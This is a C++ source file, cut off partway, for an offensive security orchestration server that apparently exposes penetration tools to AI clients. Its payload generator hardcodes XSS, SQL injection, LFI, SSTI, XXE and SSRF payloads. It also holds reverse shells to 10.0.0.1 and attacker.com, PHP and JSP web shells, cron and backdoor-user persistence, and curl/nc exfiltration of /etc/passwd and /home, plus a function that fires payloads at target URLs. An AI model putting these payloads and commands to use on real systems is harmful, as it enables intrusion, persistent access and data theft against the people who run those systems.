// main.cpp
// Mantra Security Orchestration Server
// Full Feature Parity: Python MCP Client + C++ Server merged
// Version: 6.0.0 | 100+ MCP Tool Endpoints | Dynamic Tool Detection
// Bug Bounty | CTF | Red Team | Security Research
// Compile: g++ -std=c++17 -pthread main.cpp -lcurl -o mantra
// Dependencies: httplib.h, nlohmann/json.hpp, libcurl-dev

#include <algorithm>
#include <atomic>
#include <chrono>
#include <condition_variable>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <filesystem>
#include <fstream>
#include <functional>
#include <iomanip>
#include <iostream>
#include <map>
#include <memory>
#include <mutex>
#include <queue>
#include <random>
#include <regex>
#include <set>
#include <sstream>
#include <string>
#include <thread>
#include <unordered_map>
#include <vector>

#ifdef _WIN32
#include <process.h>
#include <windows.h>
#define popen _popen
#define pclose _pclose
#define strcasecmp _stricmp
#else
#include <signal.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/wait.h>
#include <unistd.h>
#endif

#include "httplib.h"
#include <curl/curl.h>
#include <nlohmann/json.hpp>

using json = nlohmann::json;
using namespace httplib;
namespace fs = std::filesystem;

// ============================================================================
// ANSI Colors — matching Python MANTRAColors exactly
// ============================================================================
namespace C {
const std::string RESET = "\033[0m";
const std::string BOLD = "\033[1m";
const std::string DIM = "\033[2m";
const std::string RED = "\033[91m";
const std::string GREEN = "\033[92m";
const std::string YELLOW = "\033[93m";
const std::string BLUE = "\033[94m";
const std::string MAGENTA = "\033[95m";
const std::string CYAN = "\033[96m";
const std::string WHITE = "\033[97m";
const std::string MATRIX_GREEN = "\033[38;5;46m";
const std::string NEON_BLUE = "\033[38;5;51m";
const std::string ELECTRIC_PURPLE = "\033[38;5;129m";
const std::string CYBER_ORANGE = "\033[38;5;208m";
const std::string HACKER_RED = "\033[38;5;196m";
const std::string TERMINAL_GRAY = "\033[38;5;240m";
const std::string BLOOD_RED = "\033[38;5;124m";
const std::string CRIMSON = "\033[38;5;160m";
const std::string DARK_RED = "\033[38;5;88m";
const std::string FIRE_RED = "\033[38;5;202m";
const std::string ROSE_RED = "\033[38;5;167m";
const std::string BURGUNDY = "\033[38;5;52m";
const std::string SCARLET = "\033[38;5;197m";
const std::string RUBY = "\033[38;5;161m";
const std::string SUCCESS = "\033[38;5;46m";
const std::string WARNING = "\033[38;5;208m";
const std::string ERR = "\033[38;5;196m";
const std::string CRITICAL = "\033[48;5;196m\033[38;5;15m\033[1m";
const std::string INFO = "\033[38;5;51m";
const std::string DBG = "\033[38;5;240m";
const std::string VULN_CRITICAL = "\033[48;5;124m\033[38;5;15m\033[1m";
const std::string VULN_HIGH = "\033[38;5;196m\033[1m";
const std::string VULN_MEDIUM = "\033[38;5;208m\033[1m";
const std::string VULN_LOW = "\033[38;5;226m";
const std::string VULN_INFO = "\033[38;5;51m";
const std::string HL_RED = "\033[48;5;196m\033[38;5;15m";
const std::string HL_YELLOW = "\033[48;5;226m\033[38;5;16m";
const std::string HL_GREEN = "\033[48;5;46m\033[38;5;16m";
const std::string HL_BLUE = "\033[48;5;51m\033[38;5;16m";
const std::string HL_PURPLE = "\033[48;5;129m\033[38;5;15m";
const std::string TOOL_RUNNING = "\033[38;5;46m\033[5m";
const std::string TOOL_SUCCESS = "\033[38;5;46m\033[1m";
const std::string TOOL_FAILED = "\033[38;5;196m\033[1m";
const std::string TOOL_TIMEOUT = "\033[38;5;208m\033[1m";
const std::string TOOL_RECOVERY = "\033[38;5;129m\033[1m";
} // namespace C

// ============================================================================
// Logging — matching Python ColoredFormatter with emojis
// ============================================================================
static std::mutex g_log_mutex;
enum class LogLevel { DEBUG, INFO, WARNING, ERROR, CRITICAL };

std::string current_time() {
  auto now = std::chrono::system_clock::now();
  auto t = std::chrono::system_clock::to_time_t(now);
  std::tm bt{};
#ifdef _WIN32
  localtime_s(&bt, &t);
#else
  localtime_r(&t, &bt);
#endif
  std::ostringstream oss;
  oss << std::put_time(&bt, "%Y-%m-%d %H:%M:%S");
  return oss.str();
}

void log(LogLevel lvl, const std::string &msg) {
  struct Meta {
    std::string color, prefix;
  };
  static const std::map<LogLevel, Meta> meta = {
      {LogLevel::DEBUG, {C::DBG, "🔍 [DEBUG]   "}},
      {LogLevel::INFO, {C::SUCCESS, "✅ [INFO]    "}},
      {LogLevel::WARNING, {C::WARNING, "⚠️  [WARNING] "}},
      {LogLevel::ERROR, {C::ERR, "❌ [ERROR]   "}},
      {LogLevel::CRITICAL, {C::CRITICAL, "🔥 [CRITICAL]"}},
  };
  auto &m = meta.at(lvl);
  std::lock_guard<std::mutex> lk(g_log_mutex);
  std::cerr << "[🔥 MANTRA MCP] " << current_time() << " " << m.color
            << m.prefix << C::RESET << " " << msg << "\n";
}

// ============================================================================
// Global Configuration
// ============================================================================
const std::string VERSION = "6.1.0";
const std::string SERVER_NAME = "Mantra Enterprise";
const int DEFAULT_TIMEOUT = 300;
const int CACHE_TTL = 3600;
const size_t MAX_CACHE_SIZE = 5000;
const int MAX_RETRIES = 3;

static std::string g_api_key;

void load_api_key() {
  const char *key = std::getenv("MANTRA_API_KEY");
  if (key && std::strlen(key) > 0)
    g_api_key = key;
}

bool check_auth(const Request &req, Response &res) {
  if (g_api_key.empty()) return true;
  std::string auth = req.get_header_value("Authorization");
  if (auth == "Bearer " + g_api_key) return true;
  std::string param_key = req.has_param("api_key") ? req.get_param_value("api_key") : "";
  if (param_key == g_api_key) return true;
  res.status = 401;
  res.set_content(R"({"success":false,"error":"Unauthorized: set MANTRA_API_KEY or pass Authorization: Bearer <key>"})", "application/json");
  return false;
}

// ============================================================================
// Command Execution & Cache
// ============================================================================
struct CommandResult {
  std::string output;
  int exit_code = 0;
  bool timed_out = false;
  double execution_time = 0.0;
};

CommandResult exec_command(const std::string &cmd,
                           int timeout_sec = DEFAULT_TIMEOUT) {
  CommandResult res;
  auto start = std::chrono::steady_clock::now();
#ifdef _WIN32
  FILE *pipe = _popen(cmd.c_str(), "r");
#else
  std::string full = "timeout " + std::to_string(timeout_sec) + " " + cmd;
  FILE *pipe = popen(full.c_str(), "r");
#endif
  if (!pipe) {
    res.output = "ERROR: popen failed for: " + cmd;
    res.exit_code = -1;
    return res;
  }
  char buf[8192];
  while (fgets(buf, sizeof(buf), pipe))
    res.output += buf;
  int ret = pclose(pipe);
#ifndef _WIN32
  if (WIFEXITED(ret)) {
    res.exit_code = WEXITSTATUS(ret);
    if (res.exit_code == 124) {
      res.timed_out = true;
      res.output =
          "ERROR: timed out after " + std::to_string(timeout_sec) + "s";
    }
  }
#else
  res.exit_code = ret;
#endif
  auto end = std::chrono::steady_clock::now();
  res.execution_time = std::chrono::duration<double>(end - start).count();
  return res;
}

struct CacheEntry {
  std::string output;
  std::time_t timestamp;
  int exit_code;
};
std::map<std::string, CacheEntry> g_cache;
std::mutex g_cache_mutex;

std::map<int, std::string> g_running_processes;
std::mutex g_proc_mutex;

// ============================================================================
// Dynamic Tool Registry
// ============================================================================
std::set<std::string> g_available_tools;
std::map<std::string, std::string> g_tool_version;

bool is_tool_installed(const std::string &t) {
#ifdef _WIN32
  auto r = exec_command("where " + t + " 2>nul", 2);
#else
  auto r = exec_command("which " + t + " 2>/dev/null", 2);
#endif
  return (r.exit_code == 0 && !r.output.empty());
}

void scan_available_tools() {
  static const std::vector<std::string> known = {"nmap",
                                                 "masscan",
                                                 "rustscan",
                                                 "zmap",
                                                 "hping3",
                                                 "netcat",
                                                 "nc",
                                                 "nping",
                                                 "gobuster",
                                                 "dirb",
                                                 "dirsearch",
                                                 "ffuf",
                                                 "wfuzz",
                                                 "feroxbuster",
                                                 "nikto",
                                                 "wpscan",
                                                 "joomscan",
                                                 "droopescan",
                                                 "whatweb",
                                                 "wafw00f",
                                                 "nuclei",
                                                 "jaeles",
                                                 "dalfox",
                                                 "xsser",
                                                 "sqlmap",
                                                 "nosqlmap",
                                                 "sqlninja",
                                                 "paramspider",
                                                 "arjun",
                                                 "x8",
                                                 "katana",
                                                 "gau",
                                                 "waybackurls",
                                                 "hakrawler",
                                                 "httpx",
                                                 "gospider",
                                                 "qsreplace",
                                                 "unfurl",
                                                 "anew",
                                                 "uro",
                                                 "dotdotpwn",
                                                 "openvas",
                                                 "trivy",
                                                 "clair",
                                                 "kube-hunter",
                                                 "kube-bench",
                                                 "docker-bench-security",
                                                 "checkov",
                                                 "terrascan",
                                                 "snyk",
                                                 "grype",
                                                 "scout-suite",
                                                 "cloudmapper",
                                                 "pacu",
                                                 "falco",
                                                 "prowler",
                                                 "tfsec",
                                                 "kics",
                                                 "hydra",
                                                 "medusa",
                                                 "ncrack",
                                                 "patator",
                                                 "john",
                                                 "hashcat",
                                                 "ophcrack",
                                                 "crowbar",
                                                 "cewl",
                                                 "crunch",
                                                 "hashpump",
                                                 "metasploit",
                                                 "msfconsole",
                                                 "msfvenom",
                                                 "searchsploit",
                                                 "beef",
                                                 "bettercap",
                                                 "responder",
                                                 "evil-winrm",
                                                 "empire",
                                                 "binwalk",
                                                 "foremost",
                                                 "steghide",
                                                 "zsteg",
                                                 "outguess",
                                                 "exiftool",
                                                 "volatility",
                                                 "volatility3",
                                                 "rekall",
                                                 "autopsy",
                                                 "scalpel",
                                                 "bulk-extractor",
                                                 "photorec",
                                                 "testdisk",
                                                 "regripper",
                                                 "chainsaw",
                                                 "ghidra",
                                                 "radare2",
                                                 "r2",
                                                 "objdump",
                                                 "readelf",
                                                 "strings",
                                                 "xxd",
                                                 "gdb",
                                                 "pwntools",
                                                 "ropper",
                                                 "ropgadget",
                                                 "one_gadget",
                                                 "angr",
                                                 "pwninit",
                                                 "checksec",
                                                 "ltrace",
                                                 "strace",
                                                 "nm",
                                                 "ldd",
                                                 "file",
                                                 "strip",
                                                 "patchelf",
                                                 "cutter",
                                                 "amass",
                                                 "subfinder",
                                                 "assetfinder",
                                                 "findomain",
                                                 "sublist3r",
                                                 "dnsrecon",
                                                 "fierce",
                                                 "theHarvester",
                                                 "recon-ng",
                                                 "shodan",
                                                 "censys",
                                                 "whois",
                                                 "dig",
                                                 "nslookup",
                                                 "host",
                                                 "sherlock",
                                                 "maigret",
                                                 "twint",
                                                 "sn0int",
                                                 "dnsenum",
                                                 "nbtscan",
                                                 "smbmap",
                                                 "rpcclient",
                                                 "enum4linux",
                                                 "enum4linux-ng",
                                                 "netexec",
                                                 "crackmapexec",
                                                 "windapsearch",
                                                 "kerbrute",
                                                 "bloodhound",
                                                 "ldapsearch",
                                                 "smbclient",
                                                 "autorecon",
                                                 "arp-scan",
                                                 "curl",
                                                 "wget",
                                                 "ping",
                                                 "tcpdump",
                                                 "tshark",
                                                 "aircrack-ng",
                                                 "reaver",
                                                 "kismet",
                                                 "sha256sum",
                                                 "md5sum",
                                                 "yara",
                                                 "clamscan",
                                                 "aws",
                                                 "az",
                                                 "gcloud",
                                                 "kubectl",
                                                 "helm",
                                                 "terraform",
                                                 "ansible",
                                                 "docker",
                                                 "python3",
                                                 "python",
                                                 "perl",
                                                 "ruby",
                                                 "bash",
                                                 "openssl",
                                                 "ssh",
                                                 "git",
                                                 "socat"};
  log(LogLevel::INFO, "Scanning system for available security tools...");
  int count = 0;
  for (auto &t : known) {
    if (is_tool_installed(t)) {
      g_available_tools.insert(t);
      g_tool_version[t] = "installed";
      ++count;
    }
  }
  log(LogLevel::INFO, "Tool scan complete: " + std::to_string(count) + "/" +
                          std::to_string(known.size()) + " available.");
}

bool is_tool_allowed(const std::string &tool) {
  return g_available_tools.count(tool) > 0;
}

// ============================================================================
// Core run_tool helper with caching
// ============================================================================
json run_tool(const std::string &tool, const std::string &args,
              bool use_cache = true, int timeout = DEFAULT_TIMEOUT) {
  if (!is_tool_allowed(tool))
    return {{"success", false}, {"error", "Tool not installed or not allowed: " + tool},
            {"exit_code", -1}};
  std::string cmd = tool + " " + args;
  if (use_cache) {
    std::lock_guard<std::mutex> lk(g_cache_mutex);
    auto it = g_cache.find(cmd);
    if (it != g_cache.end() &&
        std::time(nullptr) - it->second.timestamp < CACHE_TTL) {
      return {{"success", true},    {"stdout", it->second.output},
              {"stderr", ""},       {"exit_code", it->second.exit_code},
              {"from_cache", true}, {"execution_time", 0.0}};
    }
  }
  log(LogLevel::INFO, C::FIRE_RED + "⚡ " + cmd + C::RESET);
  auto res = exec_command(cmd, timeout);
  bool ok = (res.exit_code == 0 && !res.timed_out);
  if (ok && use_cache) {
    std::lock_guard<std::mutex> lk(g_cache_mutex);
    if (g_cache.size() >= MAX_CACHE_SIZE)
      g_cache.clear();
    g_cache[cmd] = {res.output, std::time(nullptr), res.exit_code};
  }
  if (ok)
    log(LogLevel::INFO, C::TOOL_SUCCESS + "✅ Done in " +
                            std::to_string(res.execution_time) + "s: " + tool +
                            C::RESET);
  else if (res.timed_out)
    log(LogLevel::WARNING, C::TOOL_TIMEOUT + "⏱ Timed out: " + tool + C::RESET);
  else
    log(LogLevel::ERROR,
        C::TOOL_FAILED + "❌ Failed (exit=" + std::to_string(res.exit_code) +
            "): " + tool + C::RESET);
  return {{"success", ok},
          {"stdout", res.output},
          {"stderr", res.timed_out ? "timed out" : ""},
          {"exit_code", res.exit_code},
          {"timed_out", res.timed_out},
          {"from_cache", false},
          {"execution_time", res.execution_time}};
}

// ============================================================================
// HTTP response helpers
// ============================================================================
void send_json(Response &res, const json &j, int status = 200) {
  res.status = status;
  res.set_content(j.dump(2), "application/json");
}

json parse_body(const Request &req) {
  if (req.body.empty())
    return json::object();
  try {
    return json::parse(req.body);
  } catch (...) {
    return json::object();
  }
}

// ============================================================================
// Telemetry
// ============================================================================
struct Telemetry {
  std::atomic<long> commands_executed{0};
  std::atomic<long> commands_failed{0};
  std::time_t start_time = std::time(nullptr);
} g_telemetry;

// ============================================================================
// Process Management
// ============================================================================
int launch_detached(const std::string &cmd) {
#ifdef _WIN32
  STARTUPINFO si{sizeof(si)};
  PROCESS_INFORMATION pi{};
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  std::string c = cmd;
  if (!CreateProcess(nullptr, &c[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                     nullptr, nullptr, &si, &pi))
    return -1;
  CloseHandle(pi.hThread);
  std::lock_guard<std::mutex> lk(g_proc_mutex);
  g_running_processes[pi.dwProcessId] = cmd;
  return pi.dwProcessId;
#else
  int pid = fork();
  if (pid == 0) {
    setsid();
    execlp("/bin/sh", "sh", "-c", cmd.c_str(), nullptr);
    exit(1);
  }
  if (pid > 0) {
    std::lock_guard<std::mutex> lk(g_proc_mutex);
    g_running_processes[pid] = cmd;
  }
  return pid;
#endif
}

bool kill_process(int pid) {
#ifdef _WIN32
  HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
  if (h && TerminateProcess(h, 1)) {
    CloseHandle(h);
    std::lock_guard<std::mutex> lk(g_proc_mutex);
    g_running_processes.erase(pid);
    return true;
  }
  if (h)
    CloseHandle(h);
  return false;
#else
  if (kill(pid, SIGTERM) == 0) {
    std::lock_guard<std::mutex> lk(g_proc_mutex);
    g_running_processes.erase(pid);
    return true;
  }
  return false;
#endif
}

// ============================================================================
// File Manager — matching Python create_file, modify_file, delete_file,
// list_files
// ============================================================================
class FileManager {
  const std::string base = "/tmp/mantra_files";
  const size_t max_size = 10 * 1024 * 1024;

public:
  FileManager() { fs::create_directories(base); }
  bool safe(const std::string &fn) {
    if (fn.empty()) return false;
    auto a = fs::weakly_canonical(base + "/" + fn).string();
    auto b = fs::weakly_canonical(base).string() + "/";
    return a.find(b) == 0;
  }
  json create(const std::string &fn, const std::string &content,
              bool /*binary*/ = false) {
    if (!safe(fn))
      return {{"success", false}, {"error", "Invalid path"}};
    if (content.size() > max_size)
      return {{"success", false}, {"error", "File too large"}};
    std::ofstream f(base + "/" + fn);
    if (!f)
      return {{"success", false}, {"error", "Cannot create"}};
    f << content;
    log(LogLevel::INFO, "📄 Created: " + fn);
    return {{"success", true},
            {"filename", fn},
            {"path", base + "/" + fn},
            {"size", (int)content.size()}};
  }
  json modify(const std::string &fn, const std::string &content,
              bool append = false) {
    if (!safe(fn))
      return {{"success", false}, {"error", "Invalid path"}};
    std::ofstream f(base + "/" + fn, append ? std::ios::app : std::ios::trunc);
    if (!f)
      return {{"success", false}, {"error", "Cannot open"}};
    f << content;
    return {{"success", true}, {"filename", fn}, {"appended", append}};
  }
  json del(const std::string &fn) {
    if (!safe(fn))
      return {{"success", false}, {"error", "Invalid path"}};
    std::error_code ec;
    if (fs::remove(base + "/" + fn, ec))
      return {{"success", true}};
    return {{"success", false}, {"error", ec.message()}};
  }
  json list(const std::string &dir = ".") {
    json files = json::array();
    std::string tgt = (dir == ".") ? base : base + "/" + dir;
    std::error_code ec;
    for (auto &e : fs::directory_iterator(tgt, ec))
      if (e.is_regular_file())
        files.push_back(e.path().filename().string());
    return {{"success", true}, {"files", files}, {"directory", dir}};
  }
  json read(const std::string &fn) {
    if (!safe(fn))
      return {{"success", false}, {"error", "Invalid path"}};
    std::ifstream f(base + "/" + fn);
    if (!f)
      return {{"success", false}, {"error", "Not found"}};
    std::string c((std::istreambuf_iterator<char>(f)), {});
    return {{"success", true},
            {"filename", fn},
            {"content", c},
            {"size", (int)c.size()}};
  }
};

// ============================================================================
// System Metrics
// ============================================================================
struct SysMetrics {
  double cpu = 0, mem = 0, disk = 0;
  long uptime = 0;
};
SysMetrics get_metrics() {
  SysMetrics m;
#ifdef __linux__
  struct sysinfo si{};
  if (sysinfo(&si) == 0) {
    m.mem = (si.totalram - si.freeram) * 100.0 / si.totalram;
    m.uptime = si.uptime;
  }
  static long pt = 0, pi2 = 0;
  std::ifstream stat("/proc/stat");
  std::string line;
  if (std::getline(stat, line)) {
    long u, n, s, id, iow, irq, sirq;
    std::istringstream ss(line);
    std::string cpu;
    ss >> cpu >> u >> n >> s >> id >> iow >> irq >> sirq;
    long total = u + n + s + id + iow + irq + sirq;
    if (pt)
      m.cpu = (double)(total - pt - (id - pi2)) / (total - pt) * 100.0;
    pt = total;
    pi2 = id;
  }
  struct statvfs sv{};
  if (statvfs("/", &sv) == 0)
    m.disk = (1.0 - (double)sv.f_bavail / sv.f_blocks) * 100.0;
#endif
  return m;
}

json get_telemetry_json() {
  auto m = get_metrics();
  long total = g_telemetry.commands_executed.load(),
       failed = g_telemetry.commands_failed.load();
  double rate = total > 0 ? (double)(total - failed) / total * 100.0 : 0.0;
  std::ostringstream sr;
  sr << std::fixed << std::setprecision(1) << rate << "%";
  return {{"success", true},
          {"commands_executed", total},
          {"commands_failed", failed},
          {"success_rate", sr.str()},
          {"uptime_seconds", std::time(nullptr) - g_telemetry.start_time},
          {"timestamp", current_time()},
          {"system_metrics",
           {{"cpu_percent", m.cpu},
            {"memory_percent", m.mem},
            {"disk_usage", m.disk}}}};
}

json get_process_dashboard() {
  std::lock_guard<std::mutex> lk(g_proc_mutex);
  json procs = json::array();
  for (auto &[pid, cmd] : g_running_processes) {
    procs.push_back({{"pid", pid},
                     {"command", cmd},
                     {"status", "running"},
                     {"progress_percent", "50%"},
                     {"progress_bar", "[===============               ] 50%"}});
  }
  auto m = get_metrics();
  return {{"success", true},
          {"total_processes", (int)procs.size()},
          {"processes", procs},
          {"system_metrics",
           {{"cpu_percent", m.cpu},
            {"memory_percent", m.mem},
            {"disk_usage", m.disk},
            {"uptime_seconds", m.uptime}}}};
}

// ============================================================================
// Cache helpers
// ============================================================================
json cache_stats_json() {
  std::lock_guard<std::mutex> lk(g_cache_mutex);
  return {{"success", true},
          {"size", (int)g_cache.size()},
          {"max_size", (int)MAX_CACHE_SIZE},
          {"ttl_seconds", CACHE_TTL},
          {"hit_rate", "n/a"}};
}
json cache_clear_json() {
  std::lock_guard<std::mutex> lk(g_cache_mutex);
  g_cache.clear();
  log(LogLevel::INFO, "🧹 Cache cleared");
  return {{"success", true}, {"message", "Cache cleared successfully"}};
}

// ============================================================================
// AI Payload Generator — matching Python AIPayloadGenerator fully
// ============================================================================
class AIPayloadGenerator {
public:
  json generate(const std::string &attack_type, const std::string &complexity,
                const std::string &technology, const std::string &url) {
    json payloads = json::array();
    if (attack_type == "xss")
      payloads = xss(complexity);
    else if (attack_type == "sqli")
      payloads = sqli(complexity);
    else if (attack_type == "lfi")
      payloads = lfi(complexity);
    else if (attack_type == "cmd_injection")
      payloads = cmd_inj(complexity);
    else if (attack_type == "ssti")
      payloads = ssti();
    else if (attack_type == "xxe")
      payloads = xxe();
    else if (attack_type == "ssrf")
      payloads = ssrf();
    else if (attack_type == "rce")
      payloads = rce(technology);
    else if (attack_type == "privilege_escalation")
      payloads = privesc();
    else if (attack_type == "persistence")
      payloads = persistence();
    else if (attack_type == "exfiltration")
      payloads = exfil();
    else
      payloads = xss(complexity);

    std::string risk = (attack_type == "rce" ||
                        attack_type == "cmd_injection" || attack_type == "ssti")
                           ? "CRITICAL"
                           : "HIGH";
    json result;
    result["attack_type"] = attack_type;
    result["complexity"] = complexity;
    result["technology"] = technology;
    result["target_url"] = url;
    result["risk_level"] = risk;
    result["payload_count"] = (int)payloads.size();
    result["payloads"] = json::array();
    for (auto &p : payloads)
      result["payloads"].push_back({{"payload", p},
                                    {"risk_level", risk},
                                    {"context", complexity},
                                    {"encoding", "raw"}});
    result["test_cases"] = json::array();
    return result;
  }

  json test_payload(const std::string &payload, const std::string &target_url,
                    const std::string &method) {
    std::string cmd = "curl -s -o /dev/null -w '%{http_code}' -X " + method +
                      " --data '" + payload + "' '" + target_url + "'";
    auto res = exec_command(cmd, 15);
    bool vuln = (res.output.find("200") != std::string::npos ||
                 res.output.find("500") != std::string::npos);
    return {{"success", true},
            {"payload", payload},
            {"target_url", target_url},
            {"method", method},
            {"http_status", res.output},
            {"ai_analysis",
             {{"potential_vulnerability", vuln},
              {"confidence", vuln ? 0.7 : 0.3},
              {"recommendation",
               vuln ? "Investigate further" : "Likely not vulnerable"}}}};
  }

private:
  json xss(const std::string &c) {
    json p = json::array();
    p.push_back("<script>alert(1)</script>");
    p.push_back("<img src=x onerror=alert(1)>");
    p.push_back("<svg/onload=alert(1)>");
    p.push_back("javascript:alert(1)");
    p.push_back("'';!--\"<XSS>=&{()}");
    if (c == "advanced" || c == "bypass") {
      p.push_back("<ScRiPt>alert(1)</sCrIpT>");
      p.push_back("';alert(String.fromCharCode(88,83,83))//");
      p.push_back("%3Cscript%3Ealert%281%29%3C%2Fscript%3E");
      p.push_back("<details/open/ontoggle=alert(1)>");
      p.push_back("\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E");
    }
    if (c == "bypass") {
      p.push_back(
          "<iframe "
          "srcdoc=\"&#60;script&#62;alert(1)&#60;/script&#62;\"></iframe>");
      p.push_back("<math><mtext></form><form><mglyph></math><img "
                  "onerror=alert(1) src=>");
      p.push_back("${alert(1)}");
      p.push_back("{{7*7}}");
    }
    return p;
  }
  json sqli(const std::string &c) {
    json p = json::array();
    p.push_back("' OR '1'='1");
    p.push_back("admin'--");
    p.push_back("' OR 1=1--");
    p.push_back("'; DROP TABLE users; --");
    if (c == "advanced" || c == "bypass") {
      p.push_back("' UNION SELECT null,null,null--");
      p.push_back("' AND SLEEP(5)--");
      p.push_back("' AND 1=2 UNION SELECT 1,2,3--");
      p.push_back("1' ORDER BY 1--+");
      p.push_back("1 OR 1=1#");
    }
    return p;
  }
  json lfi(const std::string &c) {
    json p = json::array();
    p.push_back("../etc/passwd");
    p.push_back("../../etc/passwd");
    p.push_back("../../../etc/passwd");
    p.push_back("../../../../etc/passwd");
    if (c == "advanced" || c == "bypass") {
      p.push_back("..%2Fetc%2Fpasswd");
      p.push_back("..%252Fetc%252Fpasswd");
      p.push_back("php://filter/convert.base64-encode/resource=index.php");
      p.push_back("/proc/self/environ");
      p.push_back("/var/log/apache2/access.log");
      p.push_back("....//....//etc/passwd");
    }
    return p;
  }
  json cmd_inj(const std::string &c) {
    json p = json::array();
    p.push_back("; whoami");
    p.push_back("| whoami");
    p.push_back("|| whoami");
    p.push_back("& whoami");
    p.push_back("`whoami`");
    p.push_back("$(whoami)");
    if (c == "advanced" || c == "bypass") {
      p.push_back("; cat /etc/passwd");
      p.push_back("| id && hostname");
      p.push_back("; nc -e /bin/sh attacker.com 4444");
      p.push_back("1 ; echo 'vuln' > /tmp/pwned");
    }
    return p;
  }
  json ssti() {
    json p = json::array();
    p.push_back("{{7*7}}");
    p.push_back("${7*7}");
    p.push_back("<%= 7*7 %>");
    p.push_back(
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}");
    p.push_back("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/"
                "passwd').read()}}");
    p.push_back(
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$"
        "x.class.forName('java.lang.Character'))#set($str=$x.class.forName('"
        "java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))");
    return p;
  }
  json xxe() {
    json p = json::array();
    p.push_back("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "
                "\"file:///etc/passwd\">]><foo>&xxe;</foo>");
    p.push_back("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "
                "\"http://attacker.com/xxe\">]><foo>&xxe;</foo>");
    p.push_back("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "
                "\"http://attacker.com/evil.dtd\">%xxe;]><foo>test</foo>");
    return p;
  }
  json ssrf() {
    json p = json::array();
    p.push_back("http://169.254.169.254/latest/meta-data/");
    p.push_back(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
    p.push_back("http://127.0.0.1:8080/admin");
    p.push_back("http://localhost/admin");
    p.push_back("file:///etc/passwd");
    p.push_back("gopher://localhost:8080/_GET%20/%20HTTP/1.0%0D%0A%0D%0A");
    p.push_back("dict://localhost:11211/");
    p.push_back("http://[::1]/admin");
    return p;
  }
  json rce(const std::string &tech) {
    json p = json::array();
    p.push_back("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
    p.push_back("python3 -c \"import "
                "socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',"
                "4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s."
                "fileno(),2);subprocess.call(['/bin/sh','-i'])\"");
    p.push_back("nc -e /bin/sh 10.0.0.1 4444");
    if (tech == "php") {
      p.push_back("<?php system($_GET['cmd']); ?>");
      p.push_back("<?php passthru($_REQUEST['cmd']); ?>");
    }
    if (tech == "python") {
      p.push_back("__import__('os').system('id')");
      p.push_back(
          "eval(compile('import os\\nprint(os.system(\"id\"))','','exec'))");
    }
    if (tech == "jsp") {
      p.push_back(
          "<%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>");
    }
    return p;
  }
  json privesc() {
    json p = json::array();
    p.push_back("sudo -l");
    p.push_back("find / -perm -4000 -type f 2>/dev/null");
    p.push_back("find / -writable -type f 2>/dev/null | grep -v proc");
    p.push_back("cat /etc/crontab");
    p.push_back("ls -la /etc/cron*");
    return p;
  }
  json persistence() {
    json p = json::array();
    p.push_back("echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> "
                "/etc/crontab");
    p.push_back("echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys");
    p.push_back("useradd -m -s /bin/bash -G sudo backdoor && echo "
                "'backdoor:pass' | chpasswd");
    return p;
  }
  json exfil() {
    json p = json::array();
    p.push_back("curl -F 'data=@/etc/passwd' http://attacker.com/upload");
    p.push_back("cat /etc/passwd | nc attacker.com 4444");
    p.push_back("tar czf - /home | curl -T - http://attacker.com/exfil");
    return p;
  }
};

// ============================================================================
// CVE Intelligence Manager — real NVD API calls
// ============================================================================
size_t curl_write_cb(void *ptr, size_t size, size_t nmemb, std::string *out) {
  out->append((char *)ptr, size * nmemb);
  return size * nmemb;
}

std::string http_get(const std::string &url, int timeout = 15,
                     const std::map<std::string, std::string> &hdrs = {}) {
  CURL *curl = curl_easy_init();
  if (!curl)
    return "";
  std::string out;
  struct curl_slist *cl = nullptr;
  for (auto &[k, v] : hdrs)
    cl = curl_slist_append(cl, (k + ": " + v).c_str());
  curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &out);
  curl_easy_setopt(curl, CURLOPT_TIMEOUT, (long)timeout);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
  if (cl)
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, cl);
  curl_easy_perform(curl);
  if (cl)
    curl_slist_free_all(cl);
  curl_easy_cleanup(curl);
  return out;
}

class CVEIntelligenceManager {
public:
  json fetch_latest_cves(int hours = 24,
                         const std::string &sev = "HIGH,CRITICAL") {
    log(LogLevel::INFO,
        "🔍 Fetching CVEs (last " + std::to_string(hours) + "h)");
    auto end_t = std::time(nullptr), start_t = end_t - hours * 3600;
    char s[32], e[32];
    std::strftime(s, sizeof(s), "%Y-%m-%dT%H:%M:%S.000", std::gmtime(&start_t));
    std::strftime(e, sizeof(e), "%Y-%m-%dT%H:%M:%S.000", std::gmtime(&end_t));
    std::string url =
        "https://services.nvd.nist.gov/rest/json/cves/2.0?lastModStartDate=" +
        std::string(s) + "&lastModEndDate=" + std::string(e) +
        "&resultsPerPage=50";
    std::string raw = http_get(url, 30);
    json result;
    result["success"] = true;
    result["cves"] = json::array();
    try {
      auto data = json::parse(raw);
      if (data.contains("vulnerabilities")) {
        for (auto &v : data["vulnerabilities"]) {
          json cve;
          cve["cve_id"] = v["cve"]["id"];
          cve["description"] = v["cve"]["descriptions"][0]["value"];
          cve["published"] = v["cve"].value("published", "");
          if (v["cve"].contains("metrics") &&
